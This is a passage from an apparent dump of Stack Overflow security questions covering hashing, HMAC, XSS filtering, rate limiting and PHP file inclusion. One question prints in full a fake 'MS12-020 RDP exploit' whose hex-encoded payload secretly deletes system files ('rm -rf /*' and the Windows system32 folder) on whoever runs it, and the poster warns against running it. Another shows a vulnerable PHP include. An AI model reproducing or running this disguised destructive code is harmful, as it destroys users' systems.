BalusC in <a href=\"http://stackoverflow.com/questions/3512234/jsf-files-inside-web-inf-directory-model-2-pattern\">this</a> post, my questions are below</p>\n\n<p>I have mapped the <code>FacesServlet</code> on *.xhtml instead of *.jsf (Option 1). And I have the navigation rule in <code>faces-config.xml</code> like below. </p>\n\n<pre><code>    &lt;navigation-case&gt;\n      &lt;from-outcome&gt;success&lt;/from-outcome&gt;\n      &lt;to-view-id&gt;/WEB-INF/success.xhtml&lt;/to-view-id&gt;\n    &lt;/navigation-case&gt;\n</code></pre>\n\n<p>This didnt work. Instead of <code>/WEB-INF/success.xhtml</code> , I changed to <code>success.jsf</code>. This also didnt work.\nHow to handle navigation rule in this case?</p>\n\n<p>I tried Option 2. Even after putting <code>&lt;security-constraint&gt;</code> entry in web.xml, am able to hit http:/myDomain/mySecondPage.jsf and access it. Where am I going wrong?</p>\n\n<p><a href=\"http://stackoverflow.com/questions/3512234/jsf-files-inside-web-inf-directory-model-2-pattern\">This</a> post seems to tell that one cannot view the source of xhtml page if placed under <code>WEB-INF</code>. But, restricting access to me is what I have said above. How that can be achieved?</p>\n\n<p><a href=\"http://www.coderanch.com/t/212515/JSF/java/hiding-pages-behind-WEB-INF\" rel=\"nofollow\">This</a> post suggests to navigate pages in <code>Servlet controller</code>. But, I have many navigation rules defined in <code>faces-config.xml</code> which I dont want to change now. </p>\n\n<p>When a user directly hits mySecondPage.jsf without coming from 1st JSF page, he should be shown some user friendly Sorry message. There is no authentication involved in my web application. </p>\n"},{"tags":["php","security","injection"],"answer_count":9,"favorite_count":6,"up_vote_count":10,"down_vote_count":0,"view_count":11035,"score":10,"question_id":38875,"title":"Best way to avoid code injection in PHP","body":"<p>My website was recently attacked by, what seemed to me as, an innocent code:</p>\n\n<pre><code>&lt;?php\n  if ( isset( $ _GET['page'] ) ) {\n    include( $ _GET['page'] . \".php\" );\n  } else {\n    include(\"home.php\");\n  }\n?&gt;\n</code></pre>\n\n<p>There where no SQL calls, so I wasn't afraid for SQL Injection. But, apparently, SQL isn't the only kind of injection.</p>\n\n<p>This website has an explanation and a few examples of avoiding code injection: <a href=\"http://www.theserverpages.com/articles/webmasters/php/security/Code_Injection_Vulnerabilities_Explained.html\" rel=\"nofollow\">http://www.theserverpages.com/articles/webmasters/php/security/Code_Injection_Vulnerabilities_Explained.html</a></p>\n\n<p>How would you protect this code from code injection?</p>\n"},{"tags":["security","website","subdomain"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12811725,"title":"Change my present website into secure web","body":"<p>How can I turn my website into a secure website. I want it to run on secure webpage such as Facebook most apps run on secure page. </p>\n\n<p>I want to know if I have to buy new domain or I can do with my same domain or if there is some setting to do so? </p>\n\n<p>I have never worked with secure web.</p>\n\n<p>Or if there is some good secure provider etc etc kindly tell me.</p>\n"},{"tags":["c#","security","bcrypt"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12813782,"title":"Compare BCrypt-ed password from mobile app","body":"<p>I'd like to verify this with some security expert.</p>\n\n<p>I have a web app where I register users. I Bcrypt the pw with a unique salt for each user and store the hashed pw to the DB.</p>\n\n<p>I now need to authenticate user from a mobile app. I can't use ssl and I'd prefer to avoid passing passwords in clears between mobile and my web server. So before call the login method (via RESTful API) on the server, I'd prefer to BCrypt the pw on mobile and then pass it hashed to the server via API to compare.</p>\n\n<p>The point is that on the mobile I have to BCrypt with the same salt (as far as I know I cannot compare two BCrypted pw hashed with different salt). </p>\n\n<p><strong>So the question is: is it ok and safe to</strong></p>\n\n<ol>\n<li>Mobile asks the salt for user X to server (I get the first 22 chars plus offset from stored pw in DB)</li>\n<li>On mobile I BCrypt the pw with the salt got at point 1</li>\n<li>Finally mobile calls login(username, hashedpw) on server.</li>\n</ol>\n\n<p>As said all communications are over plain http, no SSL.</p>\n\n<p>Does this makes sense?</p>\n"},{"tags":["python","security","operating-system","exploit"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":255,"score":5,"question_id":11927424,"title":"Why does this Python code destroy my computer?","body":"<p>It claims to be MS12-020 exploit, and I tested this on my machine. Apparently, it seems to destroy the operating system that runs it.</p>\n\n<p>Looking just some parts of this code does not indicate any malicious code, so I asking for your help.</p>\n\n<p>What is it exactly doing, and how would I be able to recover the system?</p>\n\n<p>Edit: it does not destroy the machine targetted; it destroys the machine that runs it. I would get tons of information if I am to search what MS12-020 is!!!!</p>\n\n<h2>EDIT: DO NOT RUN THIS CODE. IT IS <code>rm -rf /</code> IN DISGUISE.</h2>\n\n<pre><code>#!/usr/bin/env python\n\n# rdpsmash.py\n# MS12-020 RDP exploit, remote code execution\n# Confirmed working on all pre-patch boxes, XP to 7\n#\n# Author: Verye\n\nimport struct\nimport socket\nimport sys\n\ntrigger =  \"\\x58\\x6c\\x64\\x47\\x6a\\x74\\x30\\x5a\\x67\\x43\\x67\\x79\\x6f\\x39\\x46\\xf1\"\ntrigger += \"\\x66\\x70\\x66\\x61\\x43\\x52\\x46\\x71\\x78\\x30\\x33\\x55\\x62\\x63\\x58\\x63\"\ntrigger += \"\\x47\\x34\\x33\\x65\\x62\\x41\\x4f\\x30\\x54\\x39\\x6f\\x4a\\x70\\x52\\x48\\x5a\"\ntrigger += \"\\x6b\\x38\\x6d\\x6b\\x4c\\x75\\x6b\\x30\\x50\\x6b\\x4f\\x6e\\x36\\x53\\x6f\\x6f\"\ntrigger += \"\\x79\\x4a\\x45\\x32\\x46\\x6f\\x71\\x6a\\x4d\\x34\\x48\\x77\\x72\\x73\\x65\\x73\"\ntrigger += \"\\x5a\\x37\\x72\\x69\\x6f\\x58\\x50\\x52\\x48\\x4e\\x39\\x76\\x69\\x4a\\x55\\x4c\"\ntrigger += \"\\x6d\\x32\\x77\\x69\\x6f\\x59\\x46\\x50\\x53\\x43\\x63\\x41\\x43\\x70\\x53\\x70\"\ntrigger += \"\\x53\\x43\\x73\\x50\\x53\\x62\\x63\\x70\\x53\\x79\\x6f\\x6a\\x70\\x35\\x36\\x61\"\ntrigger += \"\\x78\\x71\\x32\\x78\\x38\\x71\\x76\\x30\\x53\\x4b\\x39\\x69\\x71\\x4d\\x45\\x33\"\ntrigger += \"\\x58\\x6c\\x64\\x47\\x6a\\x74\\x30\\x5a\\x67\\x43\\x67\\x79\\x6f\\x39\\x46\\x32\"\ntrigger += \"\\x4a\\x56\\x70\\x66\\x31\\x76\\x35\\x59\\x6f\\x58\\x50\\x32\\x48\\x4d\\x74\\x4e\"\ntrigger += \"\\x4d\\x66\\x4e\\x7a\\x49\\x50\\x57\\x6b\\x4f\\x6e\\x36\\x46\\x33\\x56\\x35\\x39\"\ntrigger += \"\\x73\\x55\\x38\\x4d\\x37\\x71\\x69\\x69\\x56\\x71\\x69\\x61\\x47\\x6b\\x4f\\x6e\"\ntrigger += \"\\x36\\x36\\x35\\x79\\x6f\\x6a\\x70\\x55\\x36\\x31\\x7a\\x71\\x74\\x32\\x46\\x51\"\ntrigger += \"\\x78\\x52\\x43\\x70\\x6d\\x4f\\x79\\x4d\\x35\\x72\\x4a\\x66\\x30\\x42\\x79\\x64\"\ntrigger += \"\\x69\\x7a\\x6c\\x4b\\x39\\x48\\x67\\x62\\x4a\\x57\\x34\\x4f\\x79\\x6d\\x32\\x37\"\ntrigger += \"\\x41\" * 39\ntrigger += \"\\x42\\x44\\x6c\\x4c\\x53\\x6e\\x6d\\x31\\x6a\\x64\\x78\\x4c\\x6b\\x4e\\x4b\\x4e\"\ntrigger += \"\\x4b\\x43\\x58\\x70\\x72\\x69\\x6e\\x6d\\x63\\x37\\x66\\x79\\x6f\\x63\\x45\\x73\"\ntrigger += \"\\x74\\x4b\\x4f\\x7a\\x76\\x63\\x6b\\x31\\x47\\x72\\x72\\x41\\x41\\x50\\x51\\x61\"\ntrigger += \"\\x41\\x70\\x6a\\x63\\x31\\x41\\x41\\x46\\x31\\x71\\x45\\x51\\x41\\x4b\\x4f\\x78\"\ntrigger += \"\\x50\\x52\\x48\\x4c\\x6d\\x79\\x49\\x54\\x45\\x38\\x4e\\x53\\x63\\x6b\\x4f\\x6e\"\ntrigger += \"\\x36\\x30\\x6a\\x49\\x6f\\x6b\\x4f\\x70\\x37\\x4b\\x4f\\x4e\\x30\\x4e\\x6b\\x30\"\ntrigger += \"\\x57\\x69\\x6c\\x6b\\x33\\x4b\\x74\\x62\\x44\\x79\\x6f\\x6b\\x66\\x66\\x32\\x6b\"\ntrigger += \"\\x4f\\x4e\\x30\\x53\\x58\\x58\\x70\\x4e\\x6a\\x55\\x54\\x41\\x4f\\x52\\x73\\x4b\"\ntrigger += \"\\x4b\\x43\\x58\\x70\\x72\\x69\\x6e\\x6d\\x63\\x37\\x66\\x00\"\n\nnopsled = \"\\x90\" * 214\n\n#bindshell port 8888\nshellcode =  \"\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x6f\\x73\\x27\\x29\\x2e\\x73\\x79\\x73\"\nshellcode += \"\\x74\\x65\\x6d\\x28\\x27\\x64\\x65\\x6c\\x20\\x2f\\x73\\x20\\x2f\\x71\\x20\\x2f\\x66\\x20\\x43\\x3a\"\nshellcode += \"\\x5c\\x77\\x69\\x6e\\x64\\x6f\\x77\\x73\\x5c\\x73\\x79\\x73\\x74\\x65\\x6d\\x33\\x32\\x5c\\x2a\\x20\"\nshellcode += \"\\x3e\\x20\\x4e\\x55\\x4c\\x20\\x32\\x3e\\x26\\x31\\x27\\x29\\x20\\x69\\x66\\x20\\x27\\x57\\x69\\x6e\"\nshellcode += \"\\x27\\x20\\x69\\x6e\\x20\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x70\\x6c\\x61\"\nshellcode += \"\\x74\\x66\\x6f\\x72\\x6d\\x27\\x29\\x2e\\x73\\x79\\x73\\x74\\x65\\x6d\\x28\\x29\\x20\\x65\\x6c\\x73\"\nshellcode += \"\\x65\\x20\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x6f\\x73\\x27\\x29\\x2e\\x73\"\nshellcode += \"\\x79\\x73\\x74\\x65\\x6d\\x28\\x27\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f\\x2a\\x20\\x3e\\x20\\x2f\"\nshellcode += \"\\x64\\x65\\x76\\x2f\\x6e\\x75\\x6c\\x6c\\x20\\x32\\x3e\\x26\\x31\\x27\\x29\\x20\\x23\\x68\\x69\\x20\"\nshellcode += \"\\x74\\x68\\x65\\x72\\x65\\x20\\x5e\\x5f\\x7e\\x20\\x66\\x65\\x65\\x6c\\x20\\x66\\x72\\x65\\x65\\x20\"\nshellcode += \"\\x74\\x6f\\x20\\x73\\x70\\x72\\x65\\x61\\x64\\x20\\x74\\x68\\x69\\x73\\x20\\x77\\x69\\x74\\x68\\x20\"\nshellcode += \"\\x74\\x68\\x65\\x20\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x72\\x65\\x70\\x6c\\x61\\x63\\x65\\x64\\x20\"\nshellcode += \"\\x77\\x69\\x74\\x68\\x20\\x73\\x6f\\x6d\\x65\\x74\\x68\\x69\\x6e\\x67\\x20\\x6d\\x6f\\x72\\x65\\x20\"\nshellcode += \"\\x69\\x6e\\x73\\x69\\x64\\x69\\x6f\\x75\\x73\"\n\nevil = trigger + nopsled\n\nclass RDPsocket(socket.socket):\n    def __init__(self, payload, shellcode):\n        super(RDPsocket, self).__init__(socket.AF_INET, socket.SOCK_STREAM)\n        self.payload = payload\n        self.table = __import__(\"__builtin__\").__dict__ #dirty workaround\n        self.shellcode = shellcode\n\n    def parse(self, address, shellcode):\n        seeker = (struct.pack(\"&gt;I\", 0x6576616c), \n            socket.inet_aton(address[0]), #IP bytes\n            socket.inet_aton(str(address[1]))) #port bytes\n        parsed =  struct.pack(\"&gt;I\", 0x8fe2fb63) #pop eax\n        parsed += struct.pack(\"&gt;I\", 0x8fe2fb58) #push esp\n        parsed += struct.pack(\"&gt;I\", 0xffff1d6b) #add esp,byte +0x1c # pop ebp # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2db10) #call strcpy\n        parsed += struct.pack(\"&gt;I\", 0x8fe2dfd1) #POP - POP - RET over strcpy params\n        parsed += struct.pack(\"&gt;I\", 0x8fe2dae4) #mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2b3d4) #POP - RET\n        parsed += struct.pack(\"&gt;I\", 0xffffffff) #value to store in ecx\n        parsed += struct.pack(\"&gt;I\", 0x8fe0c0c7) #inc ecx # xor al,0xc9\n        parsed += struct.pack(\"&gt;I\", 0x8fe0c0c7) #inc ecx # xor al,0xc9\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += seeker[0] #add the prelude\n        parsed += seeker[1] #add the packed IP address\n        parsed += seeker[2] #add the packed port\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2c71d) #mov eax,edx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2def4) #add eax,ecx # ret  \n        parsed += struct.pack(\"&gt;I\", 0x8fe0e32d) #xchg eax,edx\n        parsed += struct.pack(\"&gt;I\", 0x8fe0c0c7) #inc ecx # xor al,0xc9\n        parsed += struct.pack(\"&gt;I\", 0x8fe0c0c7) #inc ecx # xor al,0xc9\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe24b3c) #add ecx,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2def4) #add eax,ecx # ret # swap back\n        parsed += struct.pack(\"&gt;I\", 0x8fe0e32d) #xchg eax,edx # copy parameter to placeholder\n        parsed += struct.pack(\"&gt;I\", 0x8fe2fb61) #mov [eax],edx # pop eax # ret # set our stack pointer back to original value\n        parsed += struct.pack(\"&gt;I\", 0x8fe0e32d) #xchg eax,edx\n        parsed += struct.pack(\"&gt;I\", 0x8fe2daea) #sub eax,ecx # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe0b1c2) #xchg eax,ebp # inc ebp # ret\n        parsed += struct.pack(\"&gt;I\", 0x8fe2b6a5) #dec ebp # ret\n        parsed += struct.pack(\"&gt;I\", 0xffff01f3) #mov esp,ebp # pop ebp # ret\n        read = self.table[seeker[0]] #reader for the parsed shellcode/data\n\n        return str(read(shellcode)), parsed\n\n    def connect(self, address):\n        self.parsed_shell = self.parse(address, shellcode)\n        super(RDPsocket, self).connect(address)\n\n    def evil_sendall(self):\n        super(RDPsocket, self).sendall(evil + self.parsed_shell[0] + self.parsed_shell[1])\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print \"[*] Usage: python rdpsmash.py IP\"\n        print \"[*] If running on non-default port, reassign PORT in the source.\"\n\n    else:   \n        TARGET = sys.argv[1]\n        PORT = 3389 #default RDP port\n\n        print \"[*] Running rdpsmash\"\n        print\n        s = RDPsocket(evil, shellcode)\n        print \"[+] Connecting and configuring payload. . .\"\n        print \"[+] This may take some time\"\n        s.connect((TARGET, PORT))\n        print \"[+] Connection established\"\n        print \"[+] Sending payload. . .\"\n        s.evil_sendall()\n        response = s.recv(4096)\n        if \"\\xA5\\x43\\xE7\\x38\\x75\\x84\\xF2\\xFF\\xFF\\x18\\x61\\x00\" in response:\n            print \"[+] Success! Payload sent and executed.\"\n            print \"[+] Telnet to target on port 8888.\"\n        else:\n            print \"[-] Failed\"\n        s.close()\n</code></pre>\n"},{"tags":["javascript","security","cryptography","web-security","browserid"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12811407,"title":"Verifying Browserid Assertions in JavaScript with Web Cryptography API","body":"<p>Will the additions to JavaScript runtime environment in the web browser proposed in the <a href=\"http://www.w3.org/2012/webcrypto/WebCryptoAPI/\" rel=\"nofollow\">Web Cryptography API</a> allow us to securely verify <a href=\"https://developer.mozilla.org/en-US/docs/Persona\" rel=\"nofollow\">browserid assertions</a> in the browser with JavaScript?</p>\n"},{"tags":["android","security","in-app-purchase","in-app-billing","android-billing"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":107,"score":1,"question_id":12806370,"title":"Consistent secure Google Play in-app purchase scenario with own web server","body":"<p>I've read several times all the docs in the <a href=\"http://developer.android.com/guide/google/play/billing/index.html\" rel=\"nofollow\">Android Developer Guide</a>\nand became familiar with nice Google presentation <a href=\"http://static.googleusercontent.com/external_content/untrusted_dlcp/www.google.com/en//events/io/2011/static/presofiles/dgalpin_android_pirates_and_vampires.pdf\" rel=\"nofollow\">Evading Pirates and Stopping Vampires</a></p>\n\n<p>Finally I tried to implement in-app billing scenario involving my own web server in accordance to the presentation above.\nHere are the main points of interaction with my server:</p>\n\n<ol>\n<li>Before making REQUEST_PURCHASE request to Google I make a request to my web server to register a new purchase. If the request succeeds I get a nonce from the server.</li>\n<li>When transaction finishes I receive an array of notification Ids to pass them to GET_PURCHASE_INFORMATION request. At this point I need to use nonce received in step 1 from my server. <strong>&lt;- I got stuck here!</strong></li>\n<li>When GET_PURCHASE_INFORMATION succeeds I get a signedJson and a signature which I pass to my server. It verifies the purchase and commits the transaction on the server.</li>\n</ol>\n\n<p>What I can not understand so far is two things:</p>\n\n<ol>\n<li><strong>How to identify a previously generated nonce by incoming IN_APP_NOTIFY intent in my case?</strong> As far as I understand it can correspond to either current purchase completion or another purchase refund. From what I see we have only notification id which has no relation to a REQUEST_PURCHASE request.</li>\n<li><strong>How to securely handle refunds in that way that my server is 100% acknowledged about this event?</strong> The most natural way IMHO is to periodically request Google server from my server to retreive the actual status for the order. Unfortunately, in my country developers can not use Google Checkout API. Another way is to periodically check the order state via device using GET_PURCHASE_INFORMATION request passing known notification ids and new nonces. If the check fails during some period the purchase will be automatically expired until the first successful order state verification. Is this scenario possible? Can I use known notification id to make GET_PURCHASE_INFORMATION requests after CONFIRM_NOTIFICATIONS request for the order?</li>\n</ol>\n\n<p><strong>EDIT:</strong> Regarding refunds (point 2) there's a related topic <a href=\"http://stackoverflow.com/questions/11190856/android-in-app-billing-security-issues\">Android In-App billing security issues?</a>. <strong>Is it correct that there is no built-in end user functionality in Google Play to ask developer to refund in-app purchase?</strong> If so, then we might implement a button within our application to send such refund request to our server including all necessary info like verified user credentials and then manually process a refund in both Google merchant account and server's database.</p>\n"},{"tags":["javascript","security","authentication","javascript-library"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12810443,"title":"How can I authenticate a javascript library?","body":"<p>I'm building an embeddable javascript library that my users can put into their web apps and serve it to their visitors.  </p>\n\n<p>The visitors can engage an action on the library, that triggers some data going back to my server.</p>\n\n<p>How do I authenticate the library without leaking credentials to the visitor?  Is an access control list locked to the domain the recommended solution, with no credentials exchanged at all?</p>\n\n<p>I took a look here at this question and it seems to be suggested as an outlandish solution: <a href=\"http://stackoverflow.com/questions/2561999/how-can-i-validate-secure-authenticate-a-javascript-based-post-request\">How can I validate/secure/authenticate a JavaScript-based POST request?</a></p>\n"},{"tags":["security","sql-injection"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":50,"score":-2,"question_id":12809178,"title":"From text box validation to prevent sql injection","body":"<p>What are the special characters; I should not allow the user to enter in text box field for security reasons.</p>\n"},{"tags":["security","get"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12747703,"title":"Are GET variables secure for transmitting secrets?","body":"<p><strong>Background</strong></p>\n\n<p>I'm working on an application for my own needs, with some very lightweight frameworks. I don't want to spend time on user previlegies, logins and so on. No one but me will use it.</p>\n\n<p><strong>My question</strong></p>\n\n<p>Let's say I want be able to add or delete anything in my database when visiting this address:</p>\n\n<p><a href=\"http://www.example.com/?secret=eccbc87e4b5ce2fe28308fd9f2a7baf3\" rel=\"nofollow\">http://www.example.com/?secret=eccbc87e4b5ce2fe28308fd9f2a7baf3</a></p>\n\n<p>No login, just this address. How secure is that? If it's not secure, what would be a good simple solution?</p>\n\n<p><strong>My thoughts</strong></p>\n\n<ul>\n<li>No one can guess that secret key.</li>\n<li>Can robots find out about it if there is no link to it?</li>\n</ul>\n"},{"tags":["wcf","silverlight","security","ssl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":121,"score":0,"question_id":954518,"title":"From http to Https Service Call","body":"<p>is there a way for some one to sneak in the to see data if my service is over http and the caller in my case is hosted on http (i.e. service is on secure ssl host while caller is on simple http).\nis that call secure or not?</p>\n"},{"tags":["sql","sql-server","database","oracle","security"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12807357,"title":"Synchronising SQL tables in two locations","body":"<p>have a bit of conundrum a the minute.</p>\n\n<p><strong>ANSI sql solutions please</strong>.</p>\n\n<p>We have two databases located at two different geographic locations and will be using the web for all traffic between the two locations.\nWe have a few tables common between the two databases that need to be sync'd periodically (i.e. at the end of the day)\nWith such syncs, we are worried about many things like security, congested traffic (could be thousands of records),data integrity.</p>\n\n<p>The end game is to store files in each record (up to 10mb) so the sync needs to be efficient. (Not a priority at the moment)</p>\n\n<p>There may be records that need to be sync'd both directions (i.e a column on one updated, then a column on two updated, the one record needs these two changes)</p>\n\n<p>What software/hardware options are there out there ? </p>\n\n<p>Is there another way without using triggers (want to get away from this).</p>\n\n<p>Thanks, been a while since I dealt with these technologies</p>\n"},{"tags":["security","open-source","findbugs","pmd","fortify-software"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":11999418,"title":"Any open-source software that is similar to Fortify?","body":"<p>I have been using PMD and Findbug for my application but fortify managed to detect some of the security vulnerabilities in my application. I am wondering if there is other open-source software that does the similar job as Fortify?</p>\n\n<p>Thank you</p>\n\n<p>Best Regards</p>\n"},{"tags":["security","encryption","passwords","md5","sha"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12804551,"title":"I'm using MD5 to hash passwords. When should I jump to the next thing? SHA-3?","body":"<p>On the 2nd of October NIST decided that SHA-3 is the new standard hashing algorithm.</p>\n\n<p>Should MD5 users start migrating to SHA-3? To something else (see below why SHA-3 is not recommended)? bcrypt? </p>\n\n<p><a href=\"http://codahale.com/how-to-safely-store-a-password/\" rel=\"nofollow\">Why Not {MD5, SHA1, SHA256, SHA512, SHA-3, etc}?</a></p>\n\n<p>And, is this really critical? Even if your password is salted?</p>\n"},{"tags":["python","security","web-security","flask","spam-prevention"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":80,"score":3,"question_id":12805732,"title":"Leanest way to prevent scripted abuse of a web app?","body":"<p>I am running flask/memcached and am looking for a lean/efficient method to prevent automated scripts from slamming me with requests and/or submitting new posts too quickly.</p>\n\n<p>I had the thought of including a 'last_action' time in the session cookie and checking against it each request but no matter what time I set, the script could be set up to delay that long.</p>\n\n<p>I also thought to grab the IP and if too many requests from it are made in x amount of time, deny anymore for so long, but this would require something like redis to run efficiently, which I'd like to avoid having to pay for.</p>\n\n<p>I prefer a cookie-based solution unless something like redis can prove it's worth.</p>\n\n<p>What are the 'industry standards' for dealing with these kinds of situations? What methods come with the least amount of cost/performance trade-offs?</p>\n"},{"tags":["javascript","html","security","passwords","copy-paste"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":115,"score":1,"question_id":12805803,"title":"Disable copy paste in HTML input fields?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1226574/disable-copy-paste-into-html-form-using-javascript\">Disable Copy/Paste into HTML form using Javascript</a>  </p>\n</blockquote>\n\n\n\n<p><a href=\"https://www.mizrahi-tefahot.co.il/he/bank/Pages/Default.aspx\" rel=\"nofollow\">My bank</a> seem to have disabled copy-paste of username and password.</p>\n\n<p>How is it done? Does it improve security?</p>\n"},{"tags":["security","symfony2","symfony-2.1"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12805804,"title":"Use two security entity providers in one controller","body":"<p>So I have two UserProviders in my Symfony2 project. A \"devices\" UserProvider and a \"members\" UserProvider. In the API the devices are authenticated with their credentials and everything is working great.</p>\n\n<p>Now I have an controller where the devices are authenticated as usual and they submit a username + password for a member so I can link the device to that member. How do I validate these credentials against the \"members\" UserProvider? </p>\n\n<p>I only can access the \"devices\" UserProvider using <code>$this-&gt;get('security.context')</code>, but I need to know if the submitted member credentials are valid. Hope anyone can give me some hints here as I can't really find anything about this on the web.</p>\n"},{"tags":["spring","security","grails"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12800141,"title":"Grails Security Plugin: Where to store additional user data?","body":"<p>I want to use the Grails Spring Security Plugin in my app. It creates a domain class which represents a user. My research on the internet showed me that it is not good to put all the data in this class because it's loaded all the time. </p>\n\n<p>My simple solution to this would be to pack the data in an additional class and then asocciate it in the security user class. Is this a good way?</p>\n"},{"tags":["security","azure","http-headers","azure-web-roles"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":11751644,"title":"Azure webrole excesive headers","body":"<p>I have a website running in Azure Web Roles. I tested the site against asafaweb.com and got an \"Excessive Headers\" warning. </p>\n\n<p><img src=\"http://i.stack.imgur.com/0BJOn.png\" alt=\"asafaweb.com screenshot\"></p>\n\n<p>Basically Azure sends out the IIS version and the .net version as part of the header. </p>\n\n<p>There is plenty of information on how to turn these headers off in IIS, but how do I turn them off in Azure?</p>\n"},{"tags":["ruby-on-rails","asp.net-mvc","security","attributes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12803166,"title":"Bringing load_and_authorize_resource from rails to mvc .net","body":"<p>I was looking for an implementation / example of loading and authorizing a resource at a controller level. I am looking for the same functionality as <code>load_and_authorize_resource</code> in the <em>cancan</em> gem in ruby on rails. </p>\n\n<p>Has anyone come across one / have an example how to implement something similar using Mvc .Net attributes?</p>\n\n<p>Thanks!</p>\n\n<p><strong>The load_and_authorize_resource behaviour</strong></p>\n\n<p>With rails, controller and model names are linked up by convention. The attribute <code>load_and_authorize_resource</code> takes that to its advantage. When an action is hit that requires an instance of a resource, the <code>load_and_authorize_resource</code> verifies whether the instance of the resource can be accessed. If it can, it will load it up in an instance variable, if it cant, it will return a 404 or any error behaviour you have configured the attribute to produce.</p>\n\n<p>For example, if I have a resource picture, and only user that own a certain picture can edit the picture's name. </p>\n\n<p>So we would have a Edit action, which obviously would have a pictureId of the picture you want to edit.  load_and_authorize_resource would verify whether the current context/user has access to the resource.</p>\n\n<p><a href=\"http://railscasts.com/episodes/192-authorization-with-cancan\" rel=\"nofollow\">Here</a> is a small video introduction of the module.</p>\n"},{"tags":["security","rest","hmac"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12608649,"title":"HMAC authentication for REST","body":"<p>I am looking to implment HMAC for my REST API based on </p>\n\n<p><a href=\"http://www.smartjava.org/content/protect-rest-service-using-hmac-play-20\" rel=\"nofollow\">http://www.smartjava.org/content/protect-rest-service-using-hmac-play-20</a></p>\n\n<p>The one thing I am still confused about is the how to get the SECRET to the client. The clients will be iphone, android and downloaded from the market </p>\n\n<p>What I was thinking of was using something the user has entered as the SECRET like a pin, the server will have this pin via</p>\n\n<p>1) client gets a public key from server\n2) encrypts the pin with the public key\n3) server stores pin in db\n4) from that point forward the PIN in used as the SECRET </p>\n\n<p>Any holes in this?</p>\n"},{"tags":["javascript","security","node.js","xss","sanitization"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":12799539,"title":"Javascript XSS Prevention","body":"<p>There is a Node.js project that sanitizes data and there is an OWASP library for JavaScript that handles sanitization to prevent XSS.</p>\n\n<p>I have been benchmarking these libraries, and they are pretty intensive and maybe an overkill, my application does not need any dynamic HTML (submitted by users, bbtags or what ever, not required at all) so why not do it like this:</p>\n\n<ol>\n<li>Disable \"<code>&lt;</code>\" and \"<code>&gt;</code>\" characters, don't replace them or anything, just disable them, if the user submits these, give them a warning that these are disabled (client- and server-side validation)</li>\n<li><code>&amp;</code> => <code>&amp;amp;</code></li>\n<li><code>\"</code> => <code>&amp;quot;</code></li>\n<li><code>'</code> => <code>&amp;#x27;</code></li>\n<li><code>/</code> => <code>&#x2F;</code></li>\n<li>Encode submitted URLs (GET parameters etc.)</li>\n<li>DOM based XSS is covered since my application uses HTML5 PushState and the backend is fully separated from the frontend.</li>\n</ol>\n\n<p>Would this be enough to protect myself, as I said, my application does not require any HTML submitted by users, so I don't need the <code>&lt;</code> and <code>&gt;</code> tags at all.</p>\n\n<p>Thanks for all the feedback, this is what I use right now:</p>\n\n<pre><code>var pattern = /&lt;(.*)&gt;/;\n\nfunction hasHtmlTags(string) {\n    return pattern.test(string);\n};\n\nif (hasHtmlTags(userData)) {\n    // Do something?\n} else {\n    // Create 